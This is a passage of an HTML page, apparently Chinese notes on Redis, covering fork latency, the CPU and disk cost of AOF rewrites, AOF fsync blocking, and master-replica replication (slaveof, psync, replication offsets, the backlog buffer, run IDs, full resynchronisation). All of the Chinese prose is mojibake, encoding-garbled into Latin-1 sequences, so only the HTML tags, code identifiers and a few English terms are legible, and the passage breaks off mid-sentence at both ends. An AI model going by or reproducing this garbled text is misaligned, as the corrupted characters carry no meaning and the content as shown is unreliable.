fork æ˜¯ä¸ªé‡é‡çº§é”™è¯¯ã€‚forkæ“ä½œè€—æ—¶è·Ÿè¿›ç¨‹æ€»å†…å­˜é‡æ¯æ¯ç›¸å…³ï¼Œå¦‚æœä½¿ç”¨è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œç‰¹åˆ«æ˜¯ Xen è™šæ‹Ÿæœºï¼Œfork æ“ä½œä¼šæ›´è€—æ—¶ã€‚</p><p>å¯¹äºé«˜å¹¶å‘ Redis å®ä¾‹ï¼Œå¦‚æœforkæ“ä½œè€—æ—¶åœ¨ç§’çº§åˆ«å°†æ‹–æ…¢ Redis å‡ ä¸‡æ¡å‘½ä»¤æ‰§è¡Œï¼Œå¯¹çº¿ä¸Šåº”ç”¨å»¶è¿Ÿå½±å“éå¸¸æ˜æ˜¾ã€‚æ­£å¸¸æƒ…å†µä¸‹ fork è€—æ—¶åº”è¯¥æ˜¯æ¯ GB æ¶ˆè€—20æ¯«ç§’å·¦å³ã€‚å¯ä»¥åœ¨<code>info stats</code>ç»Ÿè®¡ä¸­æŸ¥<code>latest_fork_usec</code>æŒ‡æ ‡è·å–æœ€è¿‘ä¸€æ¬¡ fork æ“ä½œè€—æ—¶ï¼Œå•ä½å¾®ç§’ã€‚</p><p>æ”¹å–„forkæ“ä½œçš„è€—æ—¶ï¼š</p><ol><li>ä¼˜å…ˆä½¿ç”¨ç‰©ç†æœºæˆ–è€…é«˜æ•ˆæ”¯æŒforkæ“ä½œçš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œé¿å…ä½¿ç”¨Xenã€‚</li><li>æ§åˆ¶ Redis å®ä¾‹æœ€å¤§å¯ç”¨å†…å­˜ï¼Œfork è€—æ—¶è·Ÿå†…å­˜é‡æˆæ­£æ¯”ï¼Œçº¿ä¸Šå»ºè®®æ¯ä¸ª Redis å®ä¾‹å†…å­˜æ§åˆ¶åœ¨ 10GB ä»¥å†…ã€‚</li><li>åˆç†é…ç½® Linux å†…å­˜åˆ†é…ç­–ç•¥ï¼Œé¿å…ç‰©ç†å†…å­˜ä¸è¶³å¯¼è‡´ fork å¤±è´¥ã€‚</li><li>é™ä½ fork æ“ä½œçš„é¢‘ç‡ï¼Œå¦‚é€‚åº¦æ”¾å®½ AOF è‡ªåŠ¨è§¦å‘æ—¶æœºï¼Œé¿å…ä¸å¿…è¦çš„å…¨é‡å¤åˆ¶ç­‰ã€‚</li></ol><h3 id="å­è¿›ç¨‹å¼€é”€ç›‘æ§å’Œä¼˜åŒ–"><a href="#å­è¿›ç¨‹å¼€é”€ç›‘æ§å’Œä¼˜åŒ–" class="headerlink" title="å­è¿›ç¨‹å¼€é”€ç›‘æ§å’Œä¼˜åŒ–"></a>å­è¿›ç¨‹å¼€é”€ç›‘æ§å’Œä¼˜åŒ–</h3><h4 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h4><ul><li>CPUå¼€é”€åˆ†æã€‚å­è¿›ç¨‹è´Ÿè´£æŠŠè¿›ç¨‹å†…çš„æ•°æ®åˆ†æ‰¹å†™å…¥æ–‡ä»¶ï¼Œè¿™ä¸ªè¿‡ç¨‹å±äºCPUå¯†é›†æ“ä½œï¼Œé€šå¸¸å­è¿›ç¨‹å¯¹å•æ ¸CPUåˆ©ç”¨ç‡æ¥è¿‘90%.</li><li>CPUæ¶ˆè€—ä¼˜åŒ–ã€‚Redisæ˜¯CPUå¯†é›†å‹æœåŠ¡ï¼Œä¸è¦åšç»‘å®šå•æ ¸CPUæ“ä½œã€‚ç”±äºå­è¿›ç¨‹éå¸¸æ¶ˆè€—CPUï¼Œä¼šå’Œçˆ¶è¿›ç¨‹äº§ç”Ÿå•æ ¸èµ„æºç«äº‰ã€‚</li><li>ä¸è¦å’Œå…¶ä»–CPUå¯†é›†å‹æœåŠ¡éƒ¨ç½²åœ¨ä¸€èµ·ï¼Œé€ æˆCPUè¿‡åº¦ç«äº‰ã€‚</li><li>å¦‚æœéƒ¨ç½²å¤šä¸ªRediså®ä¾‹ï¼Œå°½é‡ä¿è¯åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªå­è¿›ç¨‹æ‰§è¡Œé‡å†™å·¥ä½œã€‚</li></ul><h4 id="ç¡¬ç›˜å¼€é”€"><a href="#ç¡¬ç›˜å¼€é”€" class="headerlink" title="ç¡¬ç›˜å¼€é”€"></a>ç¡¬ç›˜å¼€é”€</h4><ul><li>ä¸è¦å’Œå…¶ä»–é«˜ç¡¬ç›˜è´Ÿè½½çš„æœåŠ¡éƒ¨ç½²åœ¨ä¸€èµ·ã€‚å¦‚ï¼šå­˜å‚¨æœåŠ¡ã€æ¶ˆæ¯é˜Ÿåˆ—æœåŠ¡ç­‰ã€‚</li><li>AOFé‡å†™æ—¶ä¼šæ¶ˆè€—å¤§é‡ç¡¬ç›˜IOï¼Œå¯ä»¥å¼€å¯é…ç½®<code>no-appendfsync-on-rewrite</code>ï¼Œé»˜è®¤å…³é—­ã€‚è¡¨ç¤ºåœ¨AOFé‡å†™æœŸé—´ä¸åš<code>fsync</code>æ“ä½œã€‚</li><li>å½“å¼€å¯ AOF åŠŸèƒ½çš„ Redis ç”¨äºé«˜æµé‡å†™å…¥åœºæ™¯æ—¶ï¼Œå¦‚æœä½¿ç”¨æ™®é€šæœºæ¢°ç£ç›˜ï¼Œå†™å…¥ååä¸€èˆ¬åœ¨100MB/så·¦å³ï¼Œè¿™æ—¶ Redis å®ä¾‹çš„ç“¶é¢ˆä¸»è¦åœ¨ AOF åŒæ­¥ç¡¬ç›˜ä¸Šã€‚</li><li>å¯¹äºå•æœºé…ç½®å¤šä¸ª Redis å®ä¾‹çš„æƒ…å†µï¼Œå¯ä»¥é…ç½®ä¸åŒå®ä¾‹åˆ†ç›˜å­˜å‚¨ AOF æ–‡ä»¶ï¼Œåˆ†æ‘Šç¡¬ç›˜å†™å…¥å‹åŠ›ã€‚</li></ul><blockquote><p>âš ï¸ é…ç½®<code>no-appendfsync-on-rewrite=yes</code>æ—¶ï¼Œåœ¨æç«¯æƒ…å†µä¸‹å¯èƒ½ä¸¢å¤±æ•´ä¸ªAOFé‡å†™æœŸé—´çš„æ•°æ®ï¼Œéœ€è¦æ ¹æ®æ•°æ®å®‰å…¨æ€§å†³å®šæ˜¯å¦é…ç½®ã€‚</p></blockquote><h3 id="AOF-è¿½åŠ é˜»å¡"><a href="#AOF-è¿½åŠ é˜»å¡" class="headerlink" title="AOF è¿½åŠ é˜»å¡"></a>AOF è¿½åŠ é˜»å¡</h3><p>å½“ Redis æ‰§è¡Œ <code>fsync</code> åŒæ­¥æ—¶ï¼Œå¦‚æœç³»ç»Ÿç¡¬ç›˜ç¹å¿™ï¼Œä¼šé€ æˆ Redis ä¸»çº¿ç¨‹çš„é˜»å¡ã€‚<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g91co0mb8fj30g40hz770.jpg" alt=""></p><p>æ¯å½“å‘ç”Ÿ AOF è¿½åŠ é˜»å¡äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œåœ¨<code>info Persistence</code>ç»Ÿè®¡ä¸­ï¼Œ<code>aof_delayed_fsync</code>æŒ‡æ ‡ä¼šç´¯åŠ ï¼ŒæŸ¥çœ‹è¿™ä¸ªæŒ‡æ ‡æ–¹ä¾¿å®šä½ AOF é˜»å¡é—®é¢˜ã€‚AOFåŒæ­¥æœ€å¤šå…è®¸2ç§’çš„å»¶è¿Ÿï¼Œå½“å»¶è¿Ÿå‘ç”Ÿæ—¶è¯´æ˜ç¡¬ç›˜å­˜åœ¨é«˜è´Ÿè½½é—®é¢˜ï¼Œå¯ä»¥é€šè¿‡ç›‘æ§å·¥å…·å¦‚<code>iotop</code>ï¼Œå®šä½æ¶ˆè€—ç¡¬ç›˜IOèµ„æºçš„è¿›ç¨‹ã€‚</p><h2 id="æœ¬ç« æ€»ç»“"><a href="#æœ¬ç« æ€»ç»“" class="headerlink" title="æœ¬ç« æ€»ç»“"></a>æœ¬ç« æ€»ç»“</h2><ul><li>RDBä½¿ç”¨ä¸€æ¬¡æ€§ç”Ÿæˆå†…å­˜å¿«ç…§çš„æ–¹å¼ï¼Œäº§ç”Ÿçš„æ–‡ä»¶ç´§å‡‘å‹ç¼©æ¯”æ›´é«˜ï¼Œå› æ­¤è¯»å–RDBæ¢å¤é€Ÿåº¦æ›´å¿«ã€‚ç”±äºæ¯æ¬¡ç”ŸæˆRDBå¼€é”€è¾ƒå¤§ï¼Œ<strong>æ— æ³•åšåˆ°å®æ—¶æŒä¹…åŒ–ï¼Œä¸€èˆ¬ç”¨äºæ•°æ®å†·å¤‡å’Œå¤åˆ¶ä¼ è¾“</strong>ã€‚</li><li>AOFé€šè¿‡è¿½åŠ å†™å‘½ä»¤åˆ°æ–‡ä»¶å®ç°æŒä¹…åŒ–ï¼Œé€šè¿‡<code>appendfsync</code>å‚æ•°å¯ä»¥æ§åˆ¶å®æ—¶/ç§’çº§æŒä¹…åŒ–ã€‚å› ä¸ºéœ€è¦ä¸æ–­è¿½åŠ å†™å‘½ä»¤ï¼Œæ‰€ä»¥AOFæ–‡ä»¶ä½“ç§¯é€æ¸å˜å¤§ï¼Œéœ€è¦å®šæœŸæ‰§è¡Œé‡å†™æ“ä½œæ¥é™ä½æ–‡ä»¶ä½“ç§¯ã€‚</li><li>AOFé‡å†™å¯ä»¥é€šè¿‡<code>auto-aof-rewrite-min-size</code> å’Œ <code>auto-aof-rewritepercentage</code>å‚æ•°æ§åˆ¶è‡ªåŠ¨è§¦å‘ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>bgrewriteaof</code>å‘½ä»¤æ‰‹åŠ¨è§¦å‘ã€‚</li><li>å­è¿›ç¨‹æ‰§è¡ŒæœŸé—´ä½¿ç”¨<code>copy-on-write</code>æœºåˆ¶ä¸çˆ¶è¿›ç¨‹å…±äº«å†…å­˜ï¼Œé¿å…å†…å­˜æ¶ˆè€—ç¿»å€ã€‚AOFé‡å†™æœŸé—´è¿˜éœ€è¦ç»´æŠ¤é‡å†™ç¼“å†²åŒºï¼Œä¿å­˜æ–°çš„å†™å…¥å‘½ä»¤é¿å…æ•°æ®ä¸¢å¤±ã€‚</li></ul><h1 id="ç¬¬-6-ç« -å¤åˆ¶"><a href="#ç¬¬-6-ç« -å¤åˆ¶" class="headerlink" title="ç¬¬ 6 ç«  å¤åˆ¶"></a>ç¬¬ 6 ç«  å¤åˆ¶</h1><h2 id="å»ºç«‹å¤åˆ¶"><a href="#å»ºç«‹å¤åˆ¶" class="headerlink" title="å»ºç«‹å¤åˆ¶"></a>å»ºç«‹å¤åˆ¶</h2><p>é…ç½®å¤åˆ¶çš„ä¸‰ç§æ–¹å¼</p><ol><li>åœ¨é…ç½®æ–‡ä»¶ä¸­åŠ å…¥<code>slaveof {masterHost} {masterPort}</code> éšRediså¯åŠ¨ç”Ÿæ•ˆã€‚</li><li>åœ¨<code>redis-server</code>å¯åŠ¨å‘½ä»¤ååŠ å…¥<code>--slaveof {masterHost} {masterPort}</code> ç”Ÿæ•ˆã€‚</li><li>ç›´æ¥ä½¿ç”¨å‘½ä»¤<code>slaveof {masterHost} {masterPort}</code>ç”Ÿæ•ˆã€‚</li></ol><p>ä¸»ä»èŠ‚ç‚¹å¤åˆ¶æˆåŠŸå»ºç«‹åï¼Œå¯ä»¥ä½¿ç”¨<code>info replication</code>å‘½ä»¤æŸ¥çœ‹å¤åˆ¶ç›¸å…³çŠ¶æ€ã€‚</p><h2 id="æ–­å¼€å¤åˆ¶"><a href="#æ–­å¼€å¤åˆ¶" class="headerlink" title="æ–­å¼€å¤åˆ¶"></a>æ–­å¼€å¤åˆ¶</h2><p><code>slaveof</code>å‘½ä»¤ä¸ä½†å¯ä»¥å»ºç«‹å¤åˆ¶ï¼Œè¿˜å¯ä»¥åœ¨ä»èŠ‚ç‚¹æ‰§è¡Œ<code>slaveof no one</code>æ¥æ–­å¼€ä¸ä¸»èŠ‚ç‚¹å¤åˆ¶å…³ç³»ã€‚åŒæ—¶ï¼Œ<code>slaveof {newMasterIp} {newMasterPort}</code>è¿˜å¯ä»¥å®ç°åˆ‡ä¸»æ“ä½œï¼Œæ›´æ¢ä¸»èŠ‚ç‚¹ã€‚</p><blockquote><p>âš ï¸ åˆ‡ä¸»åä»èŠ‚ç‚¹ä¼šæ¸…ç©ºä¹‹å‰æ‰€æœ‰çš„æ•°æ®ï¼Œçº¿ä¸Šäººå·¥æ“ä½œæ—¶å°å¿ƒ<code>slaveof</code>åœ¨é”™è¯¯çš„èŠ‚ç‚¹ä¸Šæ‰§è¡Œæˆ–è€…æŒ‡å‘é”™è¯¯çš„ä¸»èŠ‚ç‚¹ã€‚</p></blockquote><p>å¯¹äºæ•°æ®æ¯”è¾ƒé‡è¦çš„èŠ‚ç‚¹ï¼Œä¸»èŠ‚ç‚¹ä¼šé€šè¿‡è®¾ç½®<code>requirepass</code>å‚æ•°è¿›è¡Œå¯†ç éªŒè¯ï¼Œè¿™æ—¶æ‰€æœ‰çš„å®¢æˆ·ç«¯è®¿é—®å¿…é¡»ä½¿ç”¨<code>auth</code>å‘½ä»¤å®è¡Œæ ¡éªŒã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œä»èŠ‚ç‚¹ä½¿ç”¨<code>slave-read-only=yes</code>é…ç½®ä¸ºåªè¯»æ¨¡å¼ã€‚ç”±äºå¤åˆ¶åªèƒ½ä»ä¸»èŠ‚ç‚¹åˆ°ä»èŠ‚ç‚¹ï¼Œå¯¹äºä»èŠ‚ç‚¹çš„ä»»ä½•ä¿®æ”¹ä¸»èŠ‚ç‚¹éƒ½æ— æ³•æ„ŸçŸ¥ï¼Œä¿®æ”¹ä»èŠ‚ç‚¹ä¼šé€ æˆä¸»ä»æ•°æ®ä¸ä¸€è‡´ã€‚å› æ­¤å»ºè®®çº¿ä¸Šä¸è¦ä¿®æ”¹ä»èŠ‚ç‚¹çš„åªè¯»æ¨¡å¼ã€‚</p><p>Redisä¸ºæˆ‘ä»¬æä¾›äº†<code>repl-disable-tcp-nodelay</code>å‚æ•°ç”¨äºæ§åˆ¶æ˜¯å¦å…³é—­<code>TCP_NODELAY</code>ï¼Œé»˜è®¤å…³é—­ï¼Œè¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li>å½“å…³é—­æ—¶ï¼Œä¸»èŠ‚ç‚¹äº§ç”Ÿçš„å‘½ä»¤æ•°æ®æ— è®ºå¤§å°éƒ½ä¼šåŠæ—¶åœ°å‘é€ç»™ä»èŠ‚ç‚¹ï¼Œè¿™æ ·ä¸»ä»ä¹‹é—´å»¶è¿Ÿä¼šå˜å°ï¼Œä½†å¢åŠ äº†ç½‘ç»œå¸¦å®½çš„æ¶ˆè€—ã€‚é€‚ç”¨äºä¸»ä»ä¹‹é—´çš„ç½‘ç»œç¯å¢ƒè‰¯å¥½çš„åœºæ™¯ï¼Œå¦‚åŒæœºæ¶æˆ–åŒæœºæˆ¿éƒ¨ç½²ã€‚</li><li>å½“å¼€å¯æ—¶ï¼Œä¸»èŠ‚ç‚¹ä¼šåˆå¹¶è¾ƒå°çš„TCPæ•°æ®åŒ…ä»è€ŒèŠ‚çœå¸¦å®½ã€‚é»˜è®¤å‘é€æ—¶é—´é—´éš”å–å†³äºLinuxçš„å†…æ ¸ï¼Œä¸€èˆ¬é»˜è®¤ä¸º40æ¯«ç§’ã€‚è¿™ç§é…ç½®èŠ‚çœäº†å¸¦å®½ä½†å¢å¤§ä¸»ä»ä¹‹é—´çš„å»¶è¿Ÿã€‚é€‚ç”¨äºä¸»ä»ç½‘ç»œç¯å¢ƒå¤æ‚æˆ–å¸¦å®½ç´§å¼ çš„åœºæ™¯ï¼Œå¦‚è·¨æœºæˆ¿éƒ¨ç½²ã€‚</li></ul><h2 id="æ‹“æ‰‘"><a href="#æ‹“æ‰‘" class="headerlink" title="æ‹“æ‰‘"></a>æ‹“æ‰‘</h2><p>æ ¹æ®æ‹“æ‰‘çš„å¤æ‚æ€§ï¼Œå¯åˆ†ä¸ºä¸‰ç§ï¼šä¸€ä¸»ä¸€ä»ã€ä¸€ä¸»å¤šä»ã€æ ‘çŠ¶ä¸»ä»ç»“æ„ã€‚</p><h3 id="ä¸€ä¸»ä¸€ä»"><a href="#ä¸€ä¸»ä¸€ä»" class="headerlink" title="ä¸€ä¸»ä¸€ä»"></a>ä¸€ä¸»ä¸€ä»</h3><p>å½“åº”ç”¨å†™å‘½ä»¤å¹¶å‘é‡è¾ƒé«˜ä¸”éœ€è¦æŒä¹…åŒ–æ—¶ï¼Œå¯ä»¥åªåœ¨ä»èŠ‚ç‚¹ä¸Šå¼€å¯AOFï¼Œè¿™æ ·æ—¢ä¿è¯æ•°æ®å®‰å…¨æ€§åŒæ—¶ä¹Ÿé¿å…äº†æŒä¹…åŒ–å¯¹ä¸»èŠ‚ç‚¹çš„æ€§èƒ½å¹²æ‰°ã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“ä¸»èŠ‚ç‚¹å…³é—­æŒä¹…åŒ–åŠŸèƒ½æ—¶ï¼Œå¦‚æœä¸»èŠ‚ç‚¹è„±æœºè¦é¿å…è‡ªåŠ¨é‡å¯æ“ä½œã€‚å› ä¸ºä¸»èŠ‚ç‚¹ä¹‹å‰æ²¡æœ‰å¼€å¯æŒä¹…åŒ–åŠŸèƒ½è‡ªåŠ¨é‡å¯åæ•°æ®é›†ä¸ºç©ºï¼Œè¿™æ—¶ä»èŠ‚ç‚¹å¦‚æœç»§ç»­å¤åˆ¶ä¸»èŠ‚ç‚¹ä¼šå¯¼è‡´ä»èŠ‚ç‚¹æ•°æ®ä¹Ÿè¢«æ¸…ç©ºçš„æƒ…å†µï¼Œä¸§å¤±äº†æŒä¹…åŒ–çš„æ„ä¹‰ã€‚å®‰å…¨çš„åšæ³•æ˜¯åœ¨ä»èŠ‚ç‚¹ä¸Šæ‰§è¡Œ<code>slaveof no one</code>æ–­å¼€ä¸ä¸»èŠ‚ç‚¹çš„å¤åˆ¶å…³ç³»ï¼Œå†é‡å¯ä¸»èŠ‚ç‚¹ä»è€Œé¿å…è¿™ä¸€é—®é¢˜ã€‚</p><h3 id="ä¸€ä¸»å¤šä»"><a href="#ä¸€ä¸»å¤šä»" class="headerlink" title="ä¸€ä¸»å¤šä»"></a>ä¸€ä¸»å¤šä»</h3><p>å¯¹äºå†™å¹¶å‘é‡è¾ƒé«˜çš„åœºæ™¯ï¼Œå¤šä¸ªä»èŠ‚ç‚¹ä¼šå¯¼è‡´ä¸»èŠ‚ç‚¹å†™å‘½ä»¤çš„å¤šæ¬¡å‘é€ä»è€Œè¿‡åº¦æ¶ˆè€—ç½‘ç»œå¸¦å®½ï¼ŒåŒæ—¶ä¹ŸåŠ é‡äº†ä¸»èŠ‚ç‚¹çš„è´Ÿè½½å½±å“æœåŠ¡ç¨³å®šæ€§ã€‚</p><h3 id="æ ‘çŠ¶ä¸»ä»ç»“æ„"><a href="#æ ‘çŠ¶ä¸»ä»ç»“æ„" class="headerlink" title="æ ‘çŠ¶ä¸»ä»ç»“æ„"></a>æ ‘çŠ¶ä¸»ä»ç»“æ„</h3><p>å½“ä¸»èŠ‚ç‚¹éœ€è¦æŒ‚è½½å¤šä¸ªä»èŠ‚ç‚¹æ—¶ä¸ºäº†é¿å…å¯¹ä¸»èŠ‚ç‚¹çš„æ€§èƒ½å¹²æ‰°ï¼Œå¯ä»¥é‡‡ç”¨æ ‘çŠ¶ä¸»ä»ç»“æ„é™ä½ä¸»èŠ‚ç‚¹å‹åŠ›ã€‚</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g91e0yu7flj30if0o442t.jpg" alt=""></p><h3 id="æ•°æ®åŒæ­¥"><a href="#æ•°æ®åŒæ­¥" class="headerlink" title="æ•°æ®åŒæ­¥"></a>æ•°æ®åŒæ­¥</h3><p>Redis åœ¨åˆæ¬¡å¤åˆ¶æ—¶ï¼Œä¼šè¿›è¡Œå…¨é‡å¤åˆ¶ï¼Œä¹‹åä¾¿ä¼šæ ¹æ®ä¸»ä»èŠ‚ç‚¹çš„å¤åˆ¶åç§»é‡è¿›è¡Œ<code>psync</code>å¢é‡å¤åˆ¶ã€‚</p><p><code>psync</code>å‘½ä»¤è¿è¡Œéœ€è¦ä»¥ä¸‹ç»„ä»¶æ”¯æŒï¼š</p><ul><li>ä¸»ä»èŠ‚ç‚¹å„è‡ªå¤åˆ¶åç§»é‡ã€‚</li><li>ä¸»èŠ‚ç‚¹å¤åˆ¶ç§¯å‹ç¼“å†²åŒºã€‚</li><li>ä¸»èŠ‚ç‚¹è¿è¡Œidã€‚</li></ul><h4 id="å¤åˆ¶åç§»é‡"><a href="#å¤åˆ¶åç§»é‡" class="headerlink" title="å¤åˆ¶åç§»é‡"></a>å¤åˆ¶åç§»é‡</h4><p>å‚ä¸å¤åˆ¶çš„ä¸»ä»èŠ‚ç‚¹éƒ½ä¼šç»´æŠ¤è‡ªèº«å¤åˆ¶åç§»é‡ã€‚ä¸»èŠ‚ç‚¹åœ¨ç†å®Œå†™å…¥å‘½ä»¤åï¼Œä¼šæŠŠå‘½ä»¤çš„å­—èŠ‚é•¿åº¦åšç´¯åŠ è®°å½•ï¼Œç»Ÿè®¡ä¿¡æ¯åœ¨<code>info relication</code>ä¸­çš„<code>master_repl_offset</code>æŒ‡æ ‡ä¸­ï¼Œä»èŠ‚ç‚¹ä¼šæ¯ç§’é’Ÿä¸ŠæŠ¥è‡ªèº«çš„å¤åˆ¶åç§»é‡ç»™ä¸»èŠ‚ç‚¹ï¼Œå› æ­¤ä¸»èŠ‚ç‚¹ä¹Ÿä¼šä¿å­˜ä»èŠ‚ç‚¹çš„å¤åˆ¶åç§»é‡ã€‚ä»èŠ‚ç‚¹åœ¨æ¥æ”¶åˆ°ä¸»èŠ‚ç‚¹å‘é€çš„å‘½ä»¤åï¼Œä¹Ÿä¼šç´¯åŠ è®°å½•è‡ªèº«çš„åç§»é‡ã€‚ç»Ÿè®¡ä¿¡æ¯åœ¨<code>info relication</code>ä¸­çš„<code>slave_repl_offset</code>æŒ‡æ ‡ä¸­ã€‚</p><p>å¯ä»¥é€šè¿‡ä¸»èŠ‚ç‚¹çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œè®¡ç®—å‡º<code>master_repl_offset_slave_offset</code>å­—èŠ‚é‡ï¼Œåˆ¤æ–­ä¸»ä»èŠ‚ç‚¹å¤åˆ¶ç›¸å·®çš„æ•°æ®é‡ï¼Œæ ¹æ®è¿™ä¸ªå·®å€¼åˆ¤å®šå½“å‰å¤åˆ¶çš„å¥åº·åº¦ã€‚å¦‚æœä¸»ä»ä¹‹é—´å¤åˆ¶åç§»é‡ç›¸å·®è¾ƒå¤§ï¼Œåˆ™å¯èƒ½æ˜¯ç½‘ç»œå»¶è¿Ÿæˆ–å‘½ä»¤é˜»å¡ç­‰åŸå› å¼•èµ·ã€‚</p><h4 id="å¤åˆ¶ç§¯å‹ç¼“å†²åŒº"><a href="#å¤åˆ¶ç§¯å‹ç¼“å†²åŒº" class="headerlink" title="å¤åˆ¶ç§¯å‹ç¼“å†²åŒº"></a>å¤åˆ¶ç§¯å‹ç¼“å†²åŒº</h4><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g91vyy7e25j30h909875n.jpg" alt=""></p><p>ä¸»èŠ‚ç‚¹å“åº”ä»èŠ‚ç‚¹çš„åŒæ­¥æ—¶ï¼Œä¸ä½†ä¼šæŠŠå‘½ä»¤å‘é€ç»™ä»èŠ‚ç‚¹ï¼Œè¿˜ä¼šå†™å…¥å¤åˆ¶ç§¯å‹ç¼“å†²åŒºã€‚ç”±äºç¼“å†²åŒºæœ¬è´¨ä¸Šæ˜¯å…ˆè¿›å…ˆå‡ºçš„å®šé•¿é˜Ÿåˆ—ï¼Œæ‰€ä»¥èƒ½å®ç°ä¿å­˜æœ€è¿‘å·²å¤åˆ¶æ•°æ®çš„åŠŸèƒ½ï¼Œç”¨äºéƒ¨åˆ†å¤åˆ¶å’Œå¤åˆ¶å‘½ä»¤ä¸¢å¤±çš„æ•°æ®è¡¥æ•‘ã€‚å¤åˆ¶ç¼“å†²åŒºç›¸å…³ç»Ÿè®¡ä¿¡æ¯ä¿å­˜åœ¨ä¸»èŠ‚ç‚¹çš„<code>info replication</code>ä¸­ã€‚</p><h4 id="ä¸»èŠ‚ç‚¹è¿è¡ŒID"><a href="#ä¸»èŠ‚ç‚¹è¿è¡ŒID" class="headerlink" title="ä¸»èŠ‚ç‚¹è¿è¡ŒID"></a>ä¸»èŠ‚ç‚¹è¿è¡ŒID</h4><p>æ¯ä¸ªRedisèŠ‚ç‚¹å¯åŠ¨åéƒ½ä¼šåŠ¨æ€åˆ†é…ä¸€ä¸ª40ä½çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä½œä¸ºè¿è¡ŒIDã€‚è¿è¡ŒIDçš„ä¸»è¦ä½œç”¨æ˜¯ç”¨æ¥å”¯ä¸€è¯†åˆ«RedisèŠ‚ç‚¹ï¼Œæ¯”å¦‚ä»èŠ‚ç‚¹ä¿å­˜ä¸»èŠ‚ç‚¹çš„è¿è¡ŒIDè¯†åˆ«è‡ªå·±æ­£åœ¨å¤åˆ¶çš„æ˜¯å“ªä¸ªä¸»èŠ‚ç‚¹ã€‚å¦‚æœåªä½¿ç”¨ip+portçš„æ–¹å¼è¯†åˆ«ä¸»èŠ‚ç‚¹ï¼Œé‚£ä¹ˆä¸»èŠ‚ç‚¹é‡å¯å˜æ›´äº†æ•´ä½“æ•°æ®é›†ï¼ˆå¦‚æ›¿æ¢RDB/AOFæ–‡ä»¶ï¼‰ï¼Œä»èŠ‚ç‚¹å†åŸºäºåç§»é‡å¤åˆ¶æ•°æ®å°†æ˜¯ä¸å®‰å…¨çš„ï¼Œå› æ­¤å½“è¿è¡ŒIDå˜åŒ–åä»èŠ‚ç‚¹å°†åšå…¨é‡å¤åˆ¶ã€‚å¯ä»¥è¿è¡Œ<code>info server</code>å‘½ä»¤æŸ¥çœ‹å½“å‰èŠ‚ç‚¹çš„è¿è¡ŒIDã€‚</p><p>å½“éœ€è¦è°ƒä¼˜ä¸€äº›å†…å­˜ç›¸å…³é…ç½®ï¼Œä¾‹å¦‚ï¼š<code>hash-max-ziplist-value</code>ç­‰ï¼Œè¿™äº›é…ç½®éœ€è¦Redisé‡æ–°åŠ è½½æ‰èƒ½ä¼˜åŒ–å·²å­˜åœ¨çš„æ•°æ®ï¼Œè¿™æ—¶å¯ä»¥ä½¿ç”¨<code>debug reload</code>å‘½ä»¤é‡æ–°åŠ è½½ RDB å¹¶ä¿æŒè¿è¡Œ ID ä¸å˜ï¼Œä»è€Œæœ‰æ•ˆé¿å…ä¸å¿…è¦çš„å…¨é‡å¤åˆ¶ã€‚</p><blockquote><p><code>debug reload</code>å‘½ä»¤ä¼šé˜»å¡å½“å‰RedisèŠ‚ç‚¹ä¸»çº¿ç¨‹ï¼Œé˜»å¡æœŸé—´ä¼šç”Ÿæˆæœ¬åœ°RDBå¿«ç…§å¹¶æ¸…ç©ºæ•°æ®ä¹‹åå†åŠ è½½RDBæ–‡ä»¶ã€‚å› æ­¤å¯¹äºå¤§æ•°æ®é‡çš„ä¸»èŠ‚ç‚¹å’Œæ— æ³•å®¹å¿é˜»å¡çš„åº”ç”¨åœºæ™¯ï¼Œè°¨æ…ä½¿ç”¨ã€‚</p></blockquote><h4 id="psync-å‘½ä»¤"><a href="#psync-å‘½ä»¤" class="headerlink" title="psync å‘½ä»¤"></a>psync å‘½ä»¤</h4><p>ä»èŠ‚ç‚¹ä½¿ç”¨<code>psync</code>å‘½ä»¤å®Œæˆéƒ¨åˆ†å¤åˆ¶å’Œå…¨é‡å¤åˆ¶åŠŸèƒ½ï¼Œå‘½ä»¤æ ¼å¼ï¼š<code>psync {runId} {offset}</code></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g91xk5bba1j30jh0hejtq.jpg" alt=""></p><p>ä¸»èŠ‚ç‚¹å›å¤<code>+FULLRESYNC {runId} {offset}</code>ä¼šè§¦å‘å…¨é‡å¤åˆ¶ï¼Œ<code>+CONTINUE</code>åˆ™è§¦å‘å¢é‡å¤åˆ¶ã€‚</p><h4 id="å…¨é‡åŒæ­¥"><a href="#å…¨é‡åŒæ­¥" class="headerlink" title="å…¨é‡åŒæ­¥"></a>å…¨é‡åŒæ­¥</h4><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g91xn7bm5rj30j30lqgp7.jpg" alt=""></p><p>å¯¹äºä»èŠ‚ç‚¹å¼€å§‹æ¥æ”¶RDBå¿«ç…§åˆ°æ¥æ”¶å®ŒæˆæœŸé—´ï¼Œä¸»èŠ‚ç‚¹ä»ç„¶å“åº”è¯»å†™å‘½ä»¤ï¼Œå› æ­¤ä¸»èŠ‚ç‚¹ä¼šæŠŠè¿™æœŸé—´å†™å‘½ä»¤æ•°æ®ä¿å­˜åœ¨å¤åˆ¶å®¢æˆ·ç«¯ç¼“å†²åŒºå†…ï¼Œå½“ä»èŠ‚ç‚¹åŠ è½½å®ŒRDBæ–‡ä»¶åï¼Œä¸»èŠ‚ç‚¹å†æŠŠç¼“å†²åŒºå†…çš„æ•°æ®å‘é€ç»™ä»èŠ‚ç‚¹ï¼Œä¿è¯ä¸»ä»ä¹‹é—´æ•°æ®ä¸€è‡´æ€§ã€‚å¦‚æœ RDB æ–‡ä»¶è¿‡å¤§ï¼Œè¶…è¿‡é¢„è®¾çš„ 